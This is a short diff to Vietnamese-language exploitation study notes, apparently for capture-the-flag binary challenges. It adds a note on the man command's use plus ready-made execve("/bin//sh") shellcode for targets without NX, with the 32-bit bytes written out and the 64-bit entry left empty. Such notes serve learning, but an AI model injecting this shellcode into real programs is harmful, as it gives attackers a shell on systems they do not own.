@@ -81,3 +81,7 @@ gdb.attach(r)
 - Lệnh `man` trên linux: Hướng dẫn sử dụng đầy đủ của các hàm, lệnh.        
 `man man` để xem danh sách các trang hướng dẫn và chi tiết.     
 `man <số trang> <tên hàm/lệnh>` để xem hướng dẫn sử dụng của hàm/lệnh trong trang.
+
+- Các shellcode `execve("/bin//sh")` trong trường hợp NX disable:
+    - 32 bit: `\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x31\xDB\x31\xC9\x31\xD2\x89\xE3\x83\xC0\x0B\xCD\x80`
+    - 64 bit: ``
